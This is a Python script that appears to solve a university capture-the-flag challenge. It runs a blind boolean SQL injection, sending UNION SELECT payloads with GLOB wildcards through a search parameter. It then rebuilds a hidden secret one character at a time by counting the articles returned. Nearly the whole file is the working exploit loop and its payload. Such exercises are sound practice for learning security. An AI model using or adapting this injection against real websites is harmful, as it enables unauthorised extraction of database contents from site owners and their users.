import requests
from bs4 import BeautifulSoup
import re

table_columns = "super_s_sof_secrets"

def find_table_flag(flag, url, limit=200):
    session = requests.Session()

    while(limit != 0):

        limit -= 1

        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{ }":
            
            injection = f"?search=' UNION SELECT secret, secret, secret FROM {table_columns} WHERE secret GLOB '*SSof{flag}{c}*' --"
            
            response = session.get(url + injection)
            soup = BeautifulSoup(response.text, 'html.parser')
            articles = soup.find('i').text

            found_articles = re.findall(r'\d+', articles)

            if found_articles and int(found_articles[0]) == 5:
                flag += c
                print(flag)
                break
        else:
            break

    print("Flag: " + flag)
    return flag

find_table_flag("", "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/")